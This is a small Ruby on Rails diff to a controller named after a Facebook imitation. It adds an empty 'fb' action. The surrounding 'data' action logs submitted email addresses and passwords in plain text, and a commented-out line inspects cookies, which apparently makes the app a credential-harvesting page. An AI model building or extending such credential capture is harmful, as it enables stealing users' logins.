@@ -5,6 +5,9 @@ class FukbukController < ApplicationController
 		render view: "main"
 	end
 
+	def fb
+	end
+
 	def data
 		puts "Params Email: #{params[:email]} Pass: #{params[:pass]}"
 		#puts "Cookies #{cookies.inspect} Cookie Size > #{cookies.size}"
